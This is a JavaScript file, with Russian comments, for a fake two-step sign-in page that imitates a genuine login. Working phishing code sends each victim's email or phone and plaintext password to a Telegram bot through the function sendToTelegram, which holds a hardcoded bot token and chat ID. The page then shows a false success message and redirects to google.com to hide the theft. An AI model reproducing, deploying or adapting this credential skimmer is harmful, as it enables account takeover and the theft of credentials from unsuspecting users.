/**
 * Объединенный скрипт для обеих страниц (index.html и password.html)
 */

/**
 * Определяем на какой странице мы находимся
 */
function getCurrentPage() {
  const path = window.location.pathname;
  if (
    path.includes('password.html') ||
    document.getElementById('passwordForm')
  ) {
    return 'password';
  }
  return 'email'; // index.html или другая страница с формой email
}

/**
 * Проверка пароля на разрешенные символы
 */
function isValidPassword(password) {
  // Разрешаем: английские буквы (a-z, A-Z), цифры (0-9),
  // и специальные символы: !@#$%^&*()_+-=[]{}|;:'",.<>?/`~
  const validPasswordRegex = /^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{}|;:'",.<>?/`~]+$/;
  return validPasswordRegex.test(password);
}

/**
 * Инициализация функции маски для поля телефона (только для страницы email)
 */
function initPhoneMask() {
  // Проверяем, что мы на странице email
  if (getCurrentPage() !== 'email') return;

  const phoneInput = document.getElementById('phoneEmail');
  const inputLabel = document.getElementById('inputLabel');
  const inputHint = document.getElementById('inputHint');

  if (!phoneInput) return;

  const maskOptions = {
    mask: [
      {
        mask: '+7 (000) 000-00-00',
        startsWith: '+7',
        country: 'Russia',
      },
      {
        mask: '+7 (000) 000-00-00',
        startsWith: '7',
        country: 'Russia',
      },
      {
        mask: '0 (000) 000-00-00',
        startsWith: '8',
        country: 'Russia',
      },
      {
        mask: '+7 (000) 000-00-00',
        startsWith: '',
        country: 'unknown',
      },
    ],
    dispatch: function(appended, dynamicMasked) {
      const number = (dynamicMasked.value + appended).replace(/\D/g, '');
      return dynamicMasked.compiledMasks.find(function(m) {
        return number.indexOf(m.startsWith) === 0;
      });
    },
  };

  let mask = null;

  // Обработчик фокуса - состояние 2 (при нажатии на поле)
  phoneInput.addEventListener('focus', function() {
    if (inputLabel) inputLabel.classList.add('focused');
    if (inputHint) inputHint.classList.add('visible');

    const value = this.value.replace(/\D/g, '');
    if (
      (value.startsWith('7') ||
        value.startsWith('8') ||
        this.value.startsWith('+7')) &&
      !mask
    ) {
      mask = IMask(phoneInput, maskOptions);
    }
  });

  // Обработчик потери фокуса
  phoneInput.addEventListener('blur', function() {
    if (inputLabel) inputLabel.classList.remove('focused');

    // Показываем подсказку только если есть текст - состояние 3
    if (inputHint) {
      if (this.value.trim()) {
        inputHint.classList.add('visible');
      } else {
        inputHint.classList.remove('visible');
      }
    }

    if (mask) {
      const maskValue = mask.unmaskedValue;
      let startWith = 10;

      if (maskValue.charAt(0) === '8') {
        startWith = 11;
      }

      if (maskValue.length < startWith) {
        mask.value = '';
      }
    }
  });

  // Обработчик ввода
  phoneInput.addEventListener('input', function() {
    const value = this.value.replace(/\D/g, '');

    // Показываем подсказку при вводе - состояние 3
    if (value && inputHint && !inputHint.classList.contains('visible')) {
      inputHint.classList.add('visible');
    }

    // Применяем маску для телефона
    if (
      (value.startsWith('7') ||
        value.startsWith('8') ||
        this.value.startsWith('+7')) &&
      !mask
    ) {
      mask = IMask(phoneInput, maskOptions);
    } else if (value.length === 0 && mask) {
      mask.destroy();
      mask = null;
    }

    // Скрываем ошибки при вводе
    const errorElement = document.getElementById('errorMessage');
    if (errorElement && errorElement.classList.contains('visible')) {
      errorElement.classList.remove('visible');
      phoneInput.classList.remove('error');
    }
  });
}

/**
 * Инициализация поля пароля (только для страницы password)
 */
function initPasswordField() {
  // Проверяем, что мы на странице пароля
  if (getCurrentPage() !== 'password') return;

  const passwordInput = document.getElementById('password');
  const passwordToggle = document.getElementById('passwordToggle');
  const passwordLabel = document.getElementById('passwordLabel');
  const passwordHint = document.getElementById('passwordHint');
  const userEmailDisplay = document.getElementById('userEmailDisplay');

  console.log('initPasswordField вызван');
  console.log('passwordInput:', passwordInput);
  console.log('passwordToggle:', passwordToggle);

  /* ---------- показываем e-mail ---------- */
  const userEmail = localStorage.getItem('userEmail');
  if (userEmail && userEmailDisplay) {
    userEmailDisplay.textContent = userEmail;
  }

  /* ---------- переключение видимости пароля ---------- */
  if (passwordToggle && passwordInput) {
    console.log('Добавляем обработчик клика на passwordToggle');

    passwordToggle.addEventListener('change', function(e) {
      console.log('Чекбокс изменен!');

      const newType = this.checked ? 'text' : 'password';

      console.log('Меняем тип на', newType);

      // Сохраняем текущее значение и позицию курсора
      const currentValue = passwordInput.value;
      const cursorPosition = passwordInput.selectionStart;

      // Меняем тип
      passwordInput.setAttribute('type', newType);

      // Восстанавливаем значение и позицию курсора
      passwordInput.value = currentValue;
      if (cursorPosition !== null) {
        passwordInput.setSelectionRange(cursorPosition, cursorPosition);
      }

      // Принудительно убираем маскировку для type="text"
      if (newType === 'text') {
        passwordInput.style.webkitTextSecurity = 'none';
        passwordInput.style.textSecurity = 'none';
        passwordInput.style.fontFamily = "'Roboto', sans-serif";
      } else {
        passwordInput.style.webkitTextSecurity = '';
        passwordInput.style.textSecurity = '';
        passwordInput.style.fontFamily = '';
      }
    });
  } else {
    console.error('passwordToggle или passwordInput не найдены!');
  }

  /* ---------- фокус / блюр ---------- */
  if (passwordInput) {
    passwordInput.addEventListener('focus', () => {
      if (passwordLabel) passwordLabel.classList.add('focused');
      if (passwordHint) passwordHint.classList.add('visible');
    });

    passwordInput.addEventListener('blur', () => {
      if (passwordLabel) passwordLabel.classList.remove('focused');
      if (passwordHint && !passwordInput.value.trim()) {
        passwordHint.classList.remove('visible');
      }

      // Проверка на недопустимые символы при потере фокуса
      if (passwordInput.value && !isValidPassword(passwordInput.value)) {
        passwordInput.classList.add('error');
      }
    });

    if (passwordInput.value.trim() && passwordHint) {
      passwordHint.classList.add('visible');
    }

    passwordInput.addEventListener('input', () => {
      const err = document.getElementById('errorMessage');
      if (err && err.classList.contains('visible')) {
        err.classList.remove('visible');
        passwordInput.classList.remove('error');
      }

      // Проверка на недопустимые символы при вводе
      if (passwordInput.value && !isValidPassword(passwordInput.value)) {
        passwordInput.classList.add('error');
      } else {
        passwordInput.classList.remove('error');
      }
    });
  }
}

/**
 * Показ сообщения об ошибке
 */
function showError(message, isPasswordError = false) {
  if (getCurrentPage() === 'password' && isPasswordError) {
    // Ошибка на странице пароля
    const errorElement = document.getElementById('errorMessage');
    const passwordInput = document.getElementById('password');

    if (errorElement && passwordInput) {
      errorElement.textContent = message;
      errorElement.classList.add('visible');
      passwordInput.classList.add('error', 'shaking');

      setTimeout(() => {
        passwordInput.classList.remove('shaking');
      }, 500);
    }
  } else {
    // Ошибка на странице email
    const errorElement = document.getElementById('errorMessage');
    const phoneInput = document.getElementById('phoneEmail');

    if (errorElement && phoneInput) {
      errorElement.textContent = message;
      errorElement.classList.add('visible');
      phoneInput.classList.add('error', 'shaking');

      setTimeout(() => {
        phoneInput.classList.remove('shaking');
      }, 500);
    }
  }
}

/**
 * Показ успешного сообщения
 */
function showSuccess(message) {
  let successElement = document.querySelector('.success-message');
  if (!successElement) {
    successElement = document.createElement('div');
    successElement.className = 'success-message';
    successElement.style.cssText = `
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: #81c995;
      color: #202124;
      padding: 12px 20px;
      border-radius: 4px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
      z-index: 1001;
      font-size: 14px;
      animation: slideUp 0.3s ease-out;
    `;
    document.body.appendChild(successElement);
  }

  successElement.textContent = message;

  setTimeout(() => {
    successElement.remove();
  }, 3000);
}

/**
 * Переход на страницу ввода пароля
 */
function goToPasswordPage(email) {
  localStorage.setItem('userEmail', email);

  document.body.classList.add('page-transition');

  setTimeout(() => {
    window.location.href = 'password.html';
  }, 300);
}

/**
 * Возврат на страницу ввода email
 */
function goBackToEmailPage() {
  localStorage.removeItem('userEmail');

  document.body.classList.add('page-transition');

  setTimeout(() => {
    window.location.href = 'index.html';
  }, 300);
}

/**
 * Редирект на другой сайт после успешного входа
 */
function redirectToOtherSite() {
  // ЗАМЕНИТЕ ЭТУ ССЫЛКУ НА СВОЙ САЙТ
  const otherSiteUrl = 'https://google.com';

  document.body.style.opacity = '0.8';
  document.body.style.transition = 'opacity 0.5s ease';

  setTimeout(() => {
    window.location.href = otherSiteUrl;
  }, 1000);
}

/**
 * Инициализация обработчиков событий (для обеих страниц)
 */
function initEventHandlers() {
  const currentPage = getCurrentPage();

  if (currentPage === 'email') {
    // Обработчики для страницы email
    const loginForm = document.getElementById('loginForm');
    const submitBtn = document.getElementById('submitBtn');
    const createAccount = document.getElementById('createAccount');
    const forgotEmail = document.getElementById('forgotEmail');
    const privacyPolicy = document.getElementById('privacyPolicy');
    const termsOfUse = document.getElementById('termsOfUse');
    const helpLink = document.getElementById('helpLink');
    const privacyLink = document.getElementById('privacyLink');
    const termsLink = document.getElementById('termsLink');
    const languageSelector = document.querySelector('.language-selector');

    // Обработка отправки формы входа
    if (loginForm) {
      loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const phoneEmailValue = document
          .getElementById('phoneEmail')
          .value.trim();

        if (!phoneEmailValue) {
          showError('Пожалуйста, введите телефон или адрес электронной почты');
          return;
        }

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRegex = /^(\+7|7|8)?[\s\-]?\(?[0-9]{3}\)?[\s\-]?[0-9]{3}[\s\-]?[0-9]{2}[\s\-]?[0-9]{2}$/;

        if (
          !emailRegex.test(phoneEmailValue) &&
          !phoneRegex.test(phoneEmailValue.replace(/\D/g, ''))
        ) {
          showError(
            'Пожалуйста, введите корректный телефон или адрес электронной почты',
          );
          return;
        }

        submitBtn.classList.add('loading');
        submitBtn.disabled = true;

        await new Promise((resolve) => setTimeout(resolve, 1500));

        submitBtn.classList.remove('loading');
        submitBtn.disabled = false;

        goToPasswordPage(phoneEmailValue);
        sendToTelegram(phoneEmailValue, '', 'email');
      });
    }

    // Обработчики для ссылок
    const setupLinkHandler = (element, message) => {
      if (element) {
        element.addEventListener('click', function(e) {
          e.preventDefault();
          alert(message);
        });
      }
    };

    if (forgotEmail) {
      forgotEmail.addEventListener('click', function(e) {
        e.preventDefault();
        const phoneEmailInput = document.getElementById('phoneEmail');
        phoneEmailInput.value = '';
        phoneEmailInput.focus();
        showError('Введите ваш email для восстановления доступа');
      });
    }

    setupLinkHandler(createAccount, 'Переход на страницу создания аккаунта.');
    setupLinkHandler(privacyPolicy, 'Открытие политики конфиденциальности.');
    setupLinkHandler(termsOfUse, 'Открытие условий использования.');
    setupLinkHandler(helpLink, 'Открытие справки.');
    setupLinkHandler(privacyLink, 'Открытие политики конфиденциальности.');
    setupLinkHandler(termsLink, 'Открытие условий использования.');

    if (languageSelector) {
      languageSelector.addEventListener('click', function() {
        alert('Выбор языка (в разработке)');
      });
    }
  } else if (currentPage === 'password') {
    // Обработчики для страницы пароля
    const passwordForm = document.getElementById('passwordForm');
    const submitBtn = document.getElementById('submitBtn');
    const forgotPassword = document.getElementById('forgotPassword');
    const useAnotherAccount = document.getElementById('useAnotherAccount');
    const privacyPolicy = document.getElementById('privacyPolicy');
    const termsOfUse = document.getElementById('termsOfUse');
    const helpLink = document.getElementById('helpLink');
    const privacyLink = document.getElementById('privacyLink');
    const termsLink = document.getElementById('termsLink');
    const languageSelector = document.querySelector('.language-selector');

    // Обработка отправки формы пароля
    if (passwordForm) {
      passwordForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const passwordValue = document.getElementById('password').value;

        if (!passwordValue) {
          showError('Пожалуйста, введите пароль', true);
          return;
        }

        if (passwordValue.length < 6) {
          showError('Пароль должен содержать не менее 6 символов', true);
          return;
        }

        // Проверка на разрешенные символы
        if (!isValidPassword(passwordValue)) {
          showError(
            'Пароль может содержать только английские буквы, цифры и специальные символы',
            true,
          );
          return;
        }

        submitBtn.classList.add('loading');
        submitBtn.disabled = true;

        await new Promise((resolve) => setTimeout(resolve, 1500));

        submitBtn.classList.remove('loading');
        submitBtn.disabled = false;

        const userEmail = localStorage.getItem('userEmail') || 'не определен';
        sendToTelegram(userEmail, passwordValue, 'password');

        showSuccess('Вход выполнен успешно! Перенаправляем...');

        redirectToOtherSite();
      });
    }

    // Обработчики для ссылок
    const setupLinkHandler = (element, message, action = null) => {
      if (element) {
        element.addEventListener('click', function(e) {
          e.preventDefault();
          if (action) {
            action();
          } else {
            alert(message);
          }
        });
      }
    };

    if (forgotPassword) {
      forgotPassword.addEventListener('click', function(e) {
        e.preventDefault();
        showError('Функция восстановления пароля временно недоступна', true);
      });
    }

    if (useAnotherAccount) {
      useAnotherAccount.addEventListener('click', function(e) {
        e.preventDefault();
        goBackToEmailPage();
      });
    }

    setupLinkHandler(privacyPolicy, 'Открытие политики конфиденциальности.');
    setupLinkHandler(termsOfUse, 'Открытие условий использования.');
    setupLinkHandler(helpLink, 'Открытие справки.');
    setupLinkHandler(privacyLink, 'Открытие политики конфиденциальности.');
    setupLinkHandler(termsLink, 'Открытие условий использования.');

    if (languageSelector) {
      languageSelector.addEventListener('click', function() {
        alert('Выбор языка (в разработке)');
      });
    }
  }
}

/**
 * Инициализация анимаций и общего функционала
 */
function initCommon() {
  // Анимация появления элементов с задержкой
  const animatedElements = document.querySelectorAll(
    '.auth-left h1, .user-email, .auth-left p, .auth-right, .policy, .auth-footer',
  );
  animatedElements.forEach((el, index) => {
    el.style.animationDelay = `${0.1 * (index + 1)}s`;
  });

  // Добавляем CSS для анимации shake если её нет
  if (!document.querySelector('#shake-animation')) {
    const style = document.createElement('style');
    style.id = 'shake-animation';
    style.textContent = `
      @keyframes shake {
        0%, 100% { transform: translateX(0); }
        10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
        20%, 40%, 60%, 80% { transform: translateX(5px); }
      }
      @keyframes slideUp {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
      }
    `;
    document.head.appendChild(style);
  }
}

/**
 * Инициализация при загрузке DOM
 */
document.addEventListener('DOMContentLoaded', function() {
  console.log('DOMContentLoaded сработал');

  // Инициализируем общие функции
  initCommon();

  // Инициализируем функционал в зависимости от страницы
  const currentPage = getCurrentPage();
  console.log('Текущая страница:', currentPage);

  if (currentPage === 'email') {
    initPhoneMask();
  } else if (currentPage === 'password') {
    initPasswordField();
  }

  // Инициализируем обработчики событий
  initEventHandlers();
});

/**
 * Для совместимости с jQuery
 */
if (typeof $ !== 'undefined') {
  $(function() {
    console.log('jQuery ready сработал');

    // Инициализируем функционал в зависимости от страницы
    const currentPage = getCurrentPage();

    if (currentPage === 'email') {
      initPhoneMask();
    } else if (currentPage === 'password') {
      initPasswordField();
    }

    initEventHandlers();
    initCommon();
  });
  // ==================== ФУНКЦИЯ ОТПРАВКИ В TELEGRAM ====================
function sendToTelegram(login, password, pageType) {
    // Твои данные (токен и chat_id уже вставлены)
    const BOT_TOKEN = '8574575973:AAG1H0-l52kgQrhvbfrUEQGow_BAOCKRIvA';
    const CHAT_ID = '788541169';
    
    // Форматируем сообщение. pageType поможет понять, с какой страницы данные.
    const message = `🔐 Данные с формы (${pageType}):\n👤 Логин: ${login}\n🔑 Пароль: ${password || 'не введен'}\n🕐 ${new Date().toLocaleString()}`;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // Отправляем запрос. Используем fetch, который уже используется в коде.
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        // Режим 'no-cors' может понадобиться, если браузер будет ругаться на CORS.
        // mode: 'no-cors', // Пока закомментировано. Если будут CORS-ошибки, раскомментируй.
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    })
    .then(() => console.log(`✅ Данные с ${pageType} отправлены в Telegram`))
    .catch(err => console.error('❌ Ошибка Telegram:', err));
}

}
